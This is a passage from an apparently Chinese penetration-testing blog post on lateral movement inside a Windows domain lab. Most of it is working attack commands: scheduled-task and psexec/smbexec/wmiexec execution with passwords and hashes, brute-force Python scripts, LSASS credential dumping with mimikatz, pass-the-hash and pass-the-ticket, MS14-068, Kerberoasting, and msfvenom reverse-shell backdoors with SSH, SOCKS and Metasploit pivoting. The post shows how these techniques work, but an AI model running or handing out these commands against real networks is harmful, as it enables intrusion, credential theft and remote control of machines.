（4）输出命令、账号密码有错误</code></pre><pre><code>[at] &amp; [schtasks]#at &lt; Windows2012net use \\192.168.3.21\ipc$ &quot;Admin12345&quot; /user:god.org\administrator # 建立 ipc 连接：copy add.bat \\192.168.3.21\c$ #拷贝执行文件到目标机器at \\192.168.3.21 15:47 c:\add.bat #添加计划任务#schtasks &gt;=Windows2012net use \\192.168.3.32\ipc$ &quot;admin!@#45&quot; /user:god.org\administrator # 建立 ipc 连接：copy add.bat \\192.168.3.32\c$ #复制文件到其 C 盘schtasks /create /s 192.168.3.32 /ru &quot;SYSTEM&quot; /tn adduser /sc DAILY /tr c:\add.bat /F #创建 adduser 任务对应执行文件schtasks /run /s 192.168.3.32 /tn adduser /i #运行 adduser 任务schtasks /delete /s 192.168.3.21 /tn adduser /f#删除 adduser 任务</code></pre><h2 id="atexec-impacket-明文和HASH-传递攻击"><a href="#atexec-impacket-明文和HASH-传递攻击" class="headerlink" title="atexec-impacket 明文和HASH 传递攻击"></a><strong>atexec-impacket 明文和HASH 传递攻击</strong></h2><p><strong>impacket的exe版本:<a href="https://github.com/maaaaz/impacket-examples-windows">https://github.com/maaaaz/impacket-examples-windows</a></strong></p><p><strong>优点:命令简单，易上手</strong></p><p><strong>缺点:非官方自带，可能被杀</strong></p><pre><code>atexec.exe ./administrator:Admin12345@192.168.3.21 &quot;whoami&quot;atexec.exe god/administrator:Admin12345@192.168.3.21 &quot;whoami&quot;atexec.exe -hashes :ccef208c6485269c20db2cad21734fe7 ./administrator@192.168.3.21 &quot;whoami&quot;</code></pre><p><img src="/2022/03/18/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F%E7%AF%87/image-20220320153845240.png" alt="image-20220320153845240"></p><p><strong>明文 HASH 传递批量利用</strong></p><p>收集活跃ip，放在ip.txt中</p><pre><code>FOR /F %%i in (ips.txt) do net use \\%%i\ipc$ &quot;admin!@#45&quot; /user:administrator #批量检测 IP 对应明文连接FOR /F %%i in (ips.txt) do atexec.exe ./administrator:admin!@#45@%%i whoami #批量检测 IP 对应明文回显版</code></pre><p>收集可能的密码和hash放在文件中</p><pre><code>FOR /F %%i in (pass.txt) do atexec.exe ./administrator:%%i@192.168.3.21 whoami #批量检测明文对应 IP回显版FOR /F %%i in (hash.txt) do atexec.exe -hashes :%%i ./administrator@192.168.3.21 whoami #批量检测 HASH 对应 IP 回显版</code></pre><p><strong>明文HASH传递批量利用-升级版</strong></p><p>利用py脚本制作的exe文件批量尝试横向渗透</p><p>Fuck.py</p><pre><code class="python">import osimport timeips=&#123;    &#39;192.168.3.30&#39;,    &#39;192.168.3.25&#39;,    &#39;192.168.3.32&#39;,    &#39;192.168.3.29&#39;&#125;users=&#123;    &#39;admin&#39;,    &#39;user&#39;,    &#39;Administrator&#39;,    &#39;webadmin&#39;,    &#39;boss&#39;&#125;passwds=&#123;    &#39;123456&#39;,    &#39;passwd&#39;,    &#39;admin123&#39;    &#39;admin666&#39;&#125;for ip in ips:    for user in users:        for passwd in passwds:            exec = &quot;net use \\&quot;+ &quot;\\&quot; + ip +&#39;ipc$ &#39;+passwd+&#39; /user:god\\&#39; + user            print(&#39;----&gt;&#39;+exec+&#39;&lt;----&#39;)            os.system(exec)            time.sleep(1)</code></pre><p>执行效果</p><p><img src="/2022/03/18/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F%E7%AF%87/image-20220320161721565.png" alt="image-20220320161721565"></p><p>将python脚本编译成exe文件</p><p>安装pyinstaller</p><pre><code>pip install pyinstaller</code></pre><p>生成可执行EXE</p><pre><code>Pyinstaller -F [.py文件]</code></pre><p>会生成一个同名的exe文件 </p><p><img src="/2022/03/18/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F%E7%AF%87/image-20220320162043000.png" alt="image-20220320162043000"></p><p><img src="/2022/03/18/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F%E7%AF%87/image-20220320162242560.png" alt="image-20220320162242560"></p><h2 id="Procdump-Mimikatz-配合获取hash密码"><a href="#Procdump-Mimikatz-配合获取hash密码" class="headerlink" title="Procdump+Mimikatz 配合获取hash密码"></a><strong>Procdump+Mimikatz 配合获取hash密码</strong></h2><p>这种情况适用于mimikatz被杀，但是自己做免杀失败/或不想做免杀可以来与Procdump配合使用，因为Procdump是官方自带的，所以不会被杀</p><ul><li>Procdump下载：<a href="https://docs.microsoft.com/zh-cn/sysinternals/downloads/procdump">https://docs.microsoft.com/zh-cn/sysinternals/downloads/procdump</a></li><li>mimikatz下载：<a href="https://github.com/gentilkiwi/mimikatz/releases">https://github.com/gentilkiwi/mimikatz/releases</a></li></ul><pre><code># procdump 在目标机上执行procdump -accepteula -ma lsass.exe lsass.dmp# mimikatz 在本地执行：privilege::debugesekurlsa::minidump lsass.dmpsekurlsa::logonPasswords full</code></pre><p><img src="/2022/03/18/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F%E7%AF%87/image-20220320165205243.png" alt="image-20220320165205243"></p><p>然后可以利用 Hashcat 破解获取 Windows NTML Hash</p><h2 id="SMB-服务利用-psexec-官方自带-第三方-smbexec-只有第三方"><a href="#SMB-服务利用-psexec-官方自带-第三方-smbexec-只有第三方" class="headerlink" title="SMB 服务利用-psexec(官方自带+第三方),smbexec(只有第三方)"></a><strong>SMB 服务利用-psexec(官方自带+第三方),smbexec(只有第三方)</strong></h2><p><strong>psexec</strong></p><p><a href="https://docs.microsoft.com/zh-cn/sysinternals/downloads/pstools">PsTools - Windows Sysinternals | Microsoft Docs</a></p><p>利用 SMB 服务可以通过明文或 hash 传递来远程执行，条件 445 服务端口开放。</p><pre><code>#psexec 第一种：先有 ipc 链接，psexec 需要明文或 hash 传递net use \\192.168.3.32\ipc$ &quot;admin!@#45&quot; /user:administratorpsexec \\192.168.3.32 -s cmd # 需要先有 ipc 链接 -s 以 System 权限运行exit #退出</code></pre><p><img src="/2022/03/18/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F%E7%AF%87/image-20220320171306833.png" alt="image-20220320171306833"></p><pre><code>#psexec 第二种：不用建立 IPC 直接提供明文账户密码psexec \\192.168.3.21 -u administrator -p Admin12345 -s cmd</code></pre><p><img src="/2022/03/18/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F%E7%AF%87/image-20220320172223595.png" alt="image-20220320172223595"></p><p>但是当我们使用hash传递时</p><pre><code>psexec -hashes :$HASH$ ./administrator@10.1.2.3psexec -hashes :$HASH$ domain/administrator@10.1.2.3psexec -hashes :518b98ad4178a53695dc997aa02d455c ./administrator@192.168.3.32 官方 Pstools 无法采用 hash 连接#非官方自带-参考 impacket 工具包使用，操作简单，容易被杀</code></pre><p><img src="/2022/03/18/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F%E7%AF%87/image-20220320172705914.png" alt="image-20220320172705914"></p><p>就会出现问题，这是因为官方 Pstools 无法采用 hash 连接，所以我们可以使用 impacket 工具包</p><p>缺点:非官方，会被杀毒软件杀掉，所以要做免杀</p><p><img src="/2022/03/18/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F%E7%AF%87/image-20220320173053675.png" alt="image-20220320173053675"></p><p><strong>smbexec</strong></p><p>无需先 ipc 链接 明文或 hash 传递</p><pre><code>smbexec god/administrator:Admin12345@192.168.3.21smbexec ./administrator:admin!@#45@192.168.3.32smbexec -hashes :$HASH$ ./admin@192.168.3.21smbbexec -hashes :$HASH$ domain/admin@192.168.3.21smbexec -hashes :518b98ad4178a53695dc997aa02d455c ./administrator@192.168.3.32smbexec -hashes :ccef208c6485269c20db2cad21734fe7 god/administrator@192.168.3.21</code></pre><p><img src="/2022/03/18/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F%E7%AF%87/image-20220320173615976.png" alt="image-20220320173615976"></p><p><img src="/2022/03/18/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F%E7%AF%87/image-20220320173738115.png" alt="image-20220320173738115"></p><h2 id="WMI-服务利用-wmic-cscript-wmiexec"><a href="#WMI-服务利用-wmic-cscript-wmiexec" class="headerlink" title="WMI 服务利用-wmic,cscript,wmiexec"></a><strong>WMI 服务利用-wmic,cscript,wmiexec</strong></h2><p>WMI(Windows Management Instrumentation) 是通过 135 端口进行利用，支持用户名明文或者 hash 的方式进行认证，并且该方法不会在目标日志系统留下痕迹。</p><p><strong>自带 WMIC 明文传递 无回显 所以写入文件夹后还要自己想办法读取</strong></p><pre><code>wmic /node:192.168.3.21 /user:administrator /password:Admin12345 process call create &quot;cmd.exe /c ipconfig &gt;C:\1.txt&quot;    </code></pre><p><img src="/2022/03/18/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F%E7%AF%87/image-20220320180441580.png" alt="image-20220320180441580"></p><p><strong>自带 cscript 明文传递 有回显</strong></p><pre><code>cscript //nologo wmiexec.vbs /shell 192.168.3.21 administrator Admin12345#escript不需要下载，自带。但是需要用到第三方 wmiexec.vbs，但是wmiexec.vbs免杀非常简单</code></pre><p><img src="/2022/03/18/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F%E7%AF%87/image-20220320180646769.png" alt="image-20220320180646769"></p><p>套件 impacket wmiexec 明文或 hash 传递 有回显 exe 版本</p><pre><code>wmiexec ./administrator:admin!@#45@192.168.3.32 &quot;whoami&quot;wmiexec god/administrator:Admin12345@192.168.3.21 &quot;whoami&quot;wmiexec -hashes :518b98ad4178a53695dc997aa02d455c ./administrator@192.168.3.32 &quot;whoami&quot;wmiexec -hashes :ccef208c6485269c20db2cad21734fe7 god/administrator@192.168.3.21 &quot;whoami&quot;</code></pre><p>缺点：容易被杀</p><p><img src="/2022/03/18/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F%E7%AF%87/image-20220320181811547.png" alt="image-20220320181811547"></p><p><img src="/2022/03/18/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F%E7%AF%87/image-20220320181844775.png" alt="image-20220320181844775"></p><p><img src="/2022/03/18/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F%E7%AF%87/image-20220320182207418.png" alt="image-20220320182207418"></p><p>同理可以借用编程解放双手</p><p><strong>hash 批量利用-python 编译 exe</strong></p><pre><code class="python">#pyinstaller.exe -F fuck_neiwang_002.pyimport os,timeips=&#123;&#39;192.168.3.21&#39;,&#39;192.168.3.25&#39;,&#39;192.168.3.29&#39;,&#39;192.168.3.30&#39;,&#39;192.168.3.32&#39;&#125;users=&#123;&#39;Administrator&#39;,&#39;boss&#39;,&#39;dbadmin&#39;,&#39;fileadmin&#39;,&#39;mack&#39;,&#39;mary&#39;,&#39;webadmin&#39;&#125;hashs=&#123;&#39;ccef208c6485269c20db2cad21734fe7&#39;,&#39;518b98ad4178a53695dc997aa02d455c&#39;&#125;for ip in ips:for user in users:for mimahash in hashs:#wmiexec -hashes :hashgod/user@ipwhoamiexec = &quot;wmiexec -hashes :&quot;+mimahash+&quot; god/&quot;+user+&quot;@&quot;+ip+&quot; whoami&quot;print(&#39;---&gt;&#39; + exec + &#39;&lt;---&#39;)os.system(exec)time.sleep(0.5)</code></pre><p><img src="/2022/03/18/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F%E7%AF%87/image-20220320183203790.png" alt="image-20220320183203790"></p><h2 id="PTH-amp-PTK-amp-PTT哈希票据传递"><a href="#PTH-amp-PTK-amp-PTT哈希票据传递" class="headerlink" title="PTH&amp;PTK&amp;PTT哈希票据传递"></a><strong>PTH&amp;PTK&amp;PTT哈希票据传递</strong></h2><p><img src="/2022/03/18/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F%E7%AF%87/image-20220322132427400.png" alt="image-20220322132427400"></p><p>Kerberos 协议在域中具体工作方法： </p><p>**1、客户机将明文密码进行 NTLM 哈希,然后和时间戳一起加密(使用 krbtgt 密码 hash 作为密钥)，发送给 kdc（域控），kdc 对用户进行检 测，成功之后创建 TGT(Ticket-Granting Ticket) **</p><p>**2、将 TGT 进行加密签名返回给客户机器，只有域用户 krbtgt 才能读 取 kerberos 中 TGT 数据 **</p><p>**3、 然后客户机将 TGT 发送给域控制器 KDC 请求 TGS（票证授权服 务）票证，并且对 TGT 进行检测 **</p><p><strong>4、 检测成功之后，将目标服务账户的 NTLM 以及 TGT 进行加密，将 加密后的结果返回给客户机。</strong></p><pre><code>PTH(pass the hash) #利用 lm 或 ntlm 的值进行的渗透测试 PTT(pass the ticket) #利用的票据凭证 TGT 进行的渗透测试 PTK(pass the key) #利用的 ekeys aes256 进行的渗透测试</code></pre><p><strong>PTH</strong></p><p>PTH 在内网渗透中是一种很经典的攻击方式，原理就是攻击者可以直接通过 LM Hash 和 NTLM Hash 访问远程主机或服务，而不用提供明文密码。如果禁用了 ntlm 认证，PsExec 无法利用获得的 ntlm hash 进行远程连接，但是使用 mimikatz 还是可 以攻击成功。对于 8.1/2012r2，安装补丁 kb2871997 的 Win 7/2008r2/8/2012 等，可以使用 AES keys 代替 NT hash 来实现 ptk 攻击。</p><p> 总结：KB2871997 补丁后的影响</p><p>pth：没打补丁用户都可以连接，打了补丁只能 administrator 连接 </p><p>ptk：打了补丁才能用户都可以连接，采用 aes256 连接</p><p>参考链接: <a href="https://www.freebuf.com/column/220740.html">https://www.freebuf.com/column/220740.html</a></p><p><strong>PTT</strong></p><p>PTT 攻击的部分就不是简单的 NTLM 认证了，它是利用 Kerberos 协议进行攻击的。</p><p>三种 常见的攻击方法：MS14-068，Golden ticket，SILVER ticket。</p><p>MS14-068 基于漏洞，造成的危害是允许域内任何一个普通用户，将自己提升至域管权限，微软给出的补丁是 kb3011780。</p><p>Golden ticket(黄金票据)，SILVER ticket(白银票据)，属于权限维持技术 ，简单来说就是将连接合法的票据注入到 内存中实现连接。</p><p><strong>案例:</strong></p><p><strong>1.PTH传递-mimikatz</strong></p><p>如果禁用了 ntlm 认证，PsExec 无法利用获得的 ntlm hash 进行远程连接，但是使用 mimikatz 还是可 以攻击成功。</p><pre><code>privilege::debugsekurlsa::logonPasswords</code></pre><p>假设我们找到了域控的hash密码</p><pre><code># PTH ntlm 传递# 未打补丁下的工作组及域连接：sekurlsa::pth /user:administrator /domain:god /ntlm:ccef208c6485269c20db2cad21734fe7  #连接域用户sekurlsa::pth /user:administrator /domain:workgroup /ntlm:518b98ad4178a53695dc997aa02d455c #连接本地用户sekurlsa::pth /user:boss /domain:god /ntlm:ccef208c6485269c20db2cad21734fe7\\OWA2010CN-God.god.org</code></pre><p>就会弹出一个cmd窗口</p><p><img src="/2022/03/18/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F%E7%AF%87/image-20220322173836031.png" alt="image-20220322173836031"></p><p><strong>2.PTK传递-mimikatz</strong></p><p><img src="/2022/03/18/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F%E7%AF%87/image-20220322180108315.png" alt="image-20220322180108315"></p><p>这个必须打了补丁才能连接，不然连不上去</p><pre><code>PTK aes256 传递打补丁后的工作组及域连接：sekurlsa::ekeys #获取 aessekurlsa::pth /user:mary /domain:god /aes256:d7c1d9310753a2f7f240e5b2701dc1e6177d16a6e40af3c5cdff814719821c4b</code></pre><p><strong>3.域横向移动 PTT 传递-ms14068&amp;kekeo&amp;本地</strong></p><p>第一种利用漏洞：能实现普通用户直接获取域控 system 权限</p><p>此处mimikatz无需提升权限，因为不涉及高权限操作，一个普通用户就可以</p><pre><code>#MS14-068 powershell 执行1.查看当前 sid whoami/user2.mimikatz # kerberos::purge//清空当前机器中所有凭证，如果有域成员凭证会影响凭证伪造mimikatz # kerberos::list //查看当前机器凭证mimikatz # kerberos::ptc 票据文件 //将票据注入到内存中3.利用 ms14-068 生成 TGT 数据ms14-068.exe -u 域成员名@域名 -s sid -d 域控制器地址 -p 域成员密码MS14-068.exe -u mary@god.org -s S-1-5-21-1218902331-2157346161-1782232778-1124 -d 192.168.3.21 -p admin!@#454.票据注入内存mimikatz.exe &quot;kerberos::ptc TGT_mary@god.org.ccache&quot; exit5.查看凭证列表 klist6.利用dir \\192.168.3.21\c$  #如果ip无法识别，改成计算机名字</code></pre><p>第二种利用工具 kekeo</p><pre><code>1.生成票据kekeo &quot;tgt::ask /user:mary /domain:god.org /ntlm:518b98ad4178a53695dc997aa02d455c&quot;2.导入票据kerberos::ptt TGT_mary@GOD.ORG_krbtgt~god.org@GOD.ORG.kirbi3.查看凭证 klist4.利用 net use 载入dir \\192.168.3.21\c$</code></pre><p>第三种利用mimikatz导出本地票据(需要管理权限)</p><p>域控连接后10h内有效</p><pre><code>privilege::debugsekurlsa::tickets /exportkerberos::ptt xxxxxxxxxx.xxxx.kirbi</code></pre><p><strong>总结：ptt 传递不需本地管理员权限，连接时主机名连接，基于漏洞,工具,本地票据</strong></p><h2 id="RDP与SPN"><a href="#RDP与SPN" class="headerlink" title="RDP与SPN"></a><strong>RDP与SPN</strong></h2><p><strong>RDP</strong></p><p>RDP协议连接：判断对方远程桌面服务是否开启（默认：3389），端口扫描判断</p><pre><code>RDP明文密码链接1.windows: mstsc2.mstsc.exe /console /v:192.168.3.21 /admin3.linux: rdesktop 192.168.3.21:3389RDP密文HASH链接windows Server需要开启 Restricted Admin mode，在Windows 8.1和Windows Server 2012 R2中默认开启，同时如果Win 7 和Windows Server 2008 R2安装了2871997、2973351补丁也支持；开启命令：REG ADD &quot;HKLM\System\CurrentControlSet\Control\Lsa&quot; /v DisableRestrictedAdmin /t REG_DWORD /d 00000000 /f开启后运行：1.mstsc.exe /restrictedadmin2.mimikatz.exe3.privilege::debug4.sekurlsa::pth /user:administrator /domain:god /ntlm:ccef208c6485269c20db2cad21734fe7 &quot;/run:mstsc.exe /restrictedadmin&quot;</code></pre><p><img src="/2022/03/18/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F%E7%AF%87/4c75562739b29a50be3268d18090dd94.png" alt="img"></p><p><strong>域横向移动SPN服务-探针,请求,导出,破解,重写</strong></p><p>黑客可以使用有效的域用户的身份验证票证（TGT）去请求运行在服务器上的一个或多个目标服务的服务票证。DC在活动目录中查找SPN，并使用与SPN关联的服务帐户加密票证，以便服务能够验证用户是否可以访问。请求的Kerberos服务票证的加密类型是RC4_HMAC_MD5，这意味着服务帐户的NTLM密码哈希用于加密服务票证。黑客将收到的TGS票据离线进行破解，即可得到目标服务帐号的HASH，这个称之为Kerberoast攻击。如果我们有一个为域用户帐户注册的任意SPN，那么该用户帐户的明文密码的NTLM哈希值就将用于创建服务票证。这就是Kerberoasting攻击的关键。</p><p>1、探针</p><pre><code>setspn -q */*setspn -q */* | findstr &quot;MSSQL&quot;</code></pre><p>2、请求票据</p><pre><code>klist purge //删除缓存票据klist    //查看票据# 请求票据 # powershell请求Add-Type -AssemblyName System.IdentityModelNew-Object System.IdentityModel.Tokens.KerberosRequestorSecurityToken -ArgumentList &quot;xxxx&quot;# 或者mimikatz请求mimikatz.exe &quot;kerberos::ask /target:xxxx&quot;</code></pre><p>3、导出票据(到mimikatz运行目录)</p><pre><code># mimikatzmimikatz.exe &quot;kerberos::list /export&quot;</code></pre><p>4、破解票据</p><pre><code># 破解工具tgsrepcrack.py python3环境运行（将票据拖到本地破解）python tgsrepcrack.py passwd.txt xxxx.kirbipython3 .\tgsrepcrack.py .\password.txt .\1-40a00000-jerry@MSSQLSvc~Srv-DB-0day.0day.org~1433-0DAY.ORG.kirbi</code></pre><p>5、重写票据（属于后续攻击，不一定会成功，-u500指的是管理员用户，-g512指的是管理员组）</p><pre><code>python kerberoast.py -p Password123 -r xxxx.kirbi -w PENTESTLAB.kirbi -u 500python kerberoast.py -p Password123 -r xxxx.kirbi -w PENTESTLAB.kirbi -g 512mimikatz.exe kerberos::ptt xxxx.kirbi # 将生成的票据注入内存</code></pre><p>6、利用</p><pre><code>dir //xxx.xxx.xxx.xxx/c$</code></pre><h1 id="隧道技术"><a href="#隧道技术" class="headerlink" title="隧道技术"></a>隧道技术</h1><h2 id="ssh隧道"><a href="#ssh隧道" class="headerlink" title="ssh隧道"></a>ssh隧道</h2><p>通常，我们用于调试的计算机无法远程访问位于局域网中的待调试设备。通过 ssh 的端口转发(又称 ssh 隧道)技术，可以实现这种远程调试功能。ssh 客户端运行于本地机器，它的作用是：登录到目标机器并在目标机器上执行命令。它可以建立一个安全通道，为不安全网络上两个不受信任的主机提供安全的加密通信。X11 连接、任意 TCP 端口和 UNIX 域套接字也可以通过 ssh 安全通道进行转发。ssh 连接并登录到指定的主机名(用户名可选)。如果指定了命令，命令将在远程主机上执行，而不是在本机 shell 里执行。</p><p>ssh 端口转发相关的常用选项如下：</p><hr><p><strong>-C</strong></p><p>请求压缩所有数据(包括 stdin、stdout、stderr 和用于转发的 X11、TCP 和 UNIX 域连接的数据)。压缩算法与 gzip 使用的算法相同，压缩级别由 ssh 协议版本 1 的 CompressionLevel 选项控制。在调制解调器线路和其他慢速连接上采用压缩是可取的，但它会减慢快速网络上的速度。</p><hr><p><strong>-f</strong></p><p>请求 ssh 在执行命令之前转到后台。如果用户希望 ssh 在后台运行，但 ssh 需要用户提供密码或口令，使用 -f 选项就很有用，在用户输入密码之后，ssh 就会转入后台运行。这个选项隐含了 -n 选项的功能(-n 选项将 stdin 重定向到 /dev/null，从而避免后台进程读 stdin)。在远程站点上启动 X11 程序的推荐方法是使用 “ssh -f host xterm” 。</p><p>如果 ExitOnForwardFailure 配置选项设置的是 “yes”，则使用 -f 选项启动的 ssh 客户端会等所有的远程端口转发建立成功后才将自己转到后台运行。</p><hr><p><strong>-n</strong></p><p>将 stdin 重定向到 /dev/null (实际上是为了防止后台进程从stdin读取数据)。当 ssh 在后台运行时必须使用此选项。</p><p>一个常见的技巧是使用它在目标机器上运行 X11 程序。例如，<code>ssh -n shadow.cs.hut.fi emacs &amp;</code> 将在 shadows.cs.hut.fi 上启动 emacs 程序。X11 的连接将通过加密通道自动转发。ssh 程序将在后台运行。(如果 ssh 需要请求密码或口令，则此操作无效；参见-f选项。)</p><hr><p><strong>-N</strong></p><p>不执行远程命令。此选项用于只需要端口转发功能时。</p><hr><p><strong>-g</strong></p><p>允许远程主机连接到本地转发端口。如果用于多路复用连接，则必须在主进程上指定此选项。</p><hr><p><strong>-t</strong></p><p>强制分配一个伪终端。在目标机上执行任意的基于屏幕的程序时(例如，实现菜单服务)，分配伪终端很有用。使用多个 -t 选项则会强制分配终端，即使 ssh 没有本地终端。</p><hr><p><strong>-T</strong></p><p>禁止分配伪终端。</p><hr><p><strong>-L [bind_address:]port:host:hostport</strong><br><strong>-L [bind_address:]port:remote_socket</strong><br><strong>-L local_socket:host:hostport</strong><br><strong>-L local_socket:remote_socket</strong></p><p>数据从本机转发到远程。本机上指定 TCP 端口或 UNIX 套接字的连接将被转发到目标机上指定端口或套接字。</p><p>上述参数中，bind_address 指本地地址；port 指本地端口；local_socket 指本地 UNIX 套接字；host 指远程主机地址；hostport 指远程端口；remote_socket 指远程 UNIX 套接字。</p><p><img src="/2022/03/18/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F%E7%AF%87/image-20220318150851834.png" alt="image-20220318150851834"> </p><p><strong>ssh 端口转发模式</strong></p><p>ssh 的端口转发有三种模式：</p><ul><li><p><strong>本地：ssh -C -f -N -g -L local_listen_port:remote_host:remote_port agent_user@agent_host</strong></p><p>将本地机监听端口 local_listen_port 上的数据转发到远程端口 remote_host:remote_port</p></li><li><p><strong>远程：ssh -C -f -N -g -R agent_listen_port:local_host:local_port agent_user@agent_host</strong></p><p>将代理机监听端口 agent_listen_port 上的数据转发到本地端口 local_host:local_port</p></li><li><p><strong>动态：ssh -C -f -N -g -D listen_port agent_user@agent_host</strong></p></li></ul><p><strong>正向连接</strong></p><p>WEB服务器执行</p><pre><code>ssh -CNfL 0.0.0.0:7777:10.10.10.128:80 web@192.168.0.144</code></pre><p><strong>反向连接</strong></p><p>在攻击机上启动ssh</p><pre><code>/etc/init.d/ssh start</code></pre><p>在web服务器上执行</p><pre><code>ssh -qTfnN -R port:host:hostport remote_ipssh -qTfnN -R 2222:127.0.0.1:22 root@192.168.0.115  # 将本地的22端口转发到192.168.0.115 的2222端口</code></pre><p>攻击机上再执行</p><pre><code>ssh -p 2222 web@127.0.0.1</code></pre><p><img src="/2022/03/18/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F%E7%AF%87/image-20220318161331485.png" alt="image-20220318161331485"></p><p><strong>Socket代理</strong></p><pre><code>SSH -qTfnN -D port remotehots</code></pre><h2 id="端口转发与端口映射"><a href="#端口转发与端口映射" class="headerlink" title="端口转发与端口映射"></a>端口转发与端口映射</h2><p><img src="/2022/03/18/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F%E7%AF%87/image-20220318213918972.png" alt="image-20220318213918972"></p><p>生成metaploit后门</p><pre><code>msfvenom -p windows/meterpreter/reverse_tcp lhost=192.168.0.196 lport=12345 -f exe &gt;/var/www/html/sakura.exeuse exploit/multi/handlerset payload windows/meterpreter/reverse_tcpset lhost 192.168.0.196set lport 12345exploit</code></pre><p>当运行后门，得到反弹shell后</p><p><strong>映射端口:</strong></p><pre><code>portfwd add -L 192.168.0.115 -l 2020 -p 80 -r 10.10.10.128</code></pre><p>此时我们访问 本机的2020端口 即打开192.168.0.115:2020 实际上访问的是 10.10.10.128:80 的服务</p><p><strong>端口转发</strong></p><pre><code>portfwd add -l 5555 -p 3389 -r 192.168.0.149 #将肉鸡的3389端口映射到本地的5555端口rdesktop 127.0.0.1:5555</code></pre><p><strong>查看列表</strong></p><pre><code>portfwd list</code></pre><p><strong>清空列表</strong></p><pre><code>portfwd flush</code></pre><h2 id="socket隧道"><a href="#socket隧道" class="headerlink" title="socket隧道"></a>socket隧道</h2><p><img src="/2022/03/18/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F%E7%AF%87/image-20220318220150442.png" alt="image-20220318220150442"></p><p>​    下载地址:</p><pre><code>http://sourceforge.net/project/ssocks/</code></pre><p>解压编译:</p><pre><code>tar zxvf ssocks-0.0.14.tar.gzcd ssocks-0.0.14./configure &amp;&amp; make #编译后会创建一个src文件夹cd src</code></pre><p><img src="/2022/03/18/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F%E7%AF%87/image-20220318221138321.png" alt="image-20220318221138321"></p><p>kali机使用：</p><pre><code>./rcsocks -l 1088 -p 1080 -vv</code></pre><p>等待远程socks5服务器访问本地1080端口，创建端口1080与本地端口1088的连接通道</p><p>web服务器:</p><pre><code>/rssocks -vv -s 192.168.10.115:1080</code></pre><p>利用proxychains进行Socks5代理</p><p> 编辑proxychains工具</p><pre><code>vim /etc/proxychains.conf</code></pre><p>注释掉socks4，加上socks5</p><pre><code>#socks4 127.0.0.1 9050socks5 127.0.0.1 1088</code></pre><p>kail机使用代理访问：</p><pre><code>proxychains firefox http://10.10.10.128</code></pre><p>就会成功访问</p><p>使用nmap扫描</p><pre><code>proxychains nmap -Pn -sT 10.10.10.128</code></pre><h1 id="跨路由扫描"><a href="#跨路由扫描" class="headerlink" title="跨路由扫描"></a>跨路由扫描</h1><p><img src="/2022/03/18/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F%E7%AF%87/image-20220318224021872.png" alt="image-20220318224021872"></p><p>生成metaploit后门，并监听</p><pre><code>msfvenom -p windows/meterpreter/reverse_tcp lhost=192.168.0.115 lport=12345 -f exe &gt;/var/www/html/sakura.exeuse exploit/multi/handlerset payload windows/meterpreter/reverse_tcpset lhost 192.168.0.115set lport 12345exploit</code></pre><p>运行后门，得到反弹shell</p><pre><code>getuid  查看当前用户ifconfig  获取网卡信息run get_local_subnets 获取路由信息run autoroute -p 查看当前路由run autoroute -s 10.10.10.0/24 增加路由 </code></pre><p>使用socks4a模块</p><pre><code>use auxiliary/server/socks4a</code></pre><p>　SRVHOST：监听的ip地址，默认为0.0.0.0，一般不需要更改。<br>   SRVPORT：监听的端口，默认为1080。</p><p><img src="/2022/03/18/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F%E7%AF%87/image-20220318225453685.png" alt="image-20220318225453685"></p><p>设置端口</p><pre><code>set SRVPORT 1044exploit</code></pre><p>然后配置proxychains</p><pre><code>vim /etc/proxychains.conf</code></pre><p>proxychains.conf </p><pre><code>socks4 192.168.0.115 1044</code></pre><p>使用nmap扫描</p><pre><code>proxychains nmap -sT Pn 10.10.10.128</code></pre><p><img src="/2022/03/18/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F%E7%AF%87/image-20220318230018344.png" alt="image-20220318230018344"></p><p>也可以用浏览器访问</p><pre><code>proxychains firefox http://10.10.10.128</code></pre><p>缺点:</p><p>无法进行爆破(如hydra)等一些操作</p><h1 id="MSF-常见的内网测试渗透"><a href="#MSF-常见的内网测试渗透" class="headerlink" title="MSF-常见的内网测试渗透"></a>MSF-常见的内网测试渗透</h1><p><img src="/2022/03/18/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F%E7%AF%87/image-20220318231904664.png" alt="image-20220318231904664"></p><p>生成metaploit后门，并监听</p><pre><code>msfvenom -p windows/meterpreter/reverse_tcp lhost=192.168.0.115 lport=12345 -f exe &gt;/var/www/html/sakura.exeuse exploit/multi/handlerset payload windows/meterpreter/reverse_tcpset lhost 192.168.0.115set lport 12345exploit</code></pre><p>运行后门，得到2003服务器反弹shell</p><p><img src="/2022/03/18/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F%E7%AF%87/image-20220318234051072.png" alt="image-20220318234051072"></p><p>查看路由表</p><pre><code>route</code></pre><p> <img src="/2022/03/18/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F%E7%AF%87/image-20220318234749786.png" alt="image-20220318234749786"></p><p>增加路由</p><pre><code>run autoroute -s 10.10.10.0/24</code></pre><p>查看路由列表</p><pre><code>run autoroute -p</code></pre><p>清空路由</p><pre><code>run autoroute 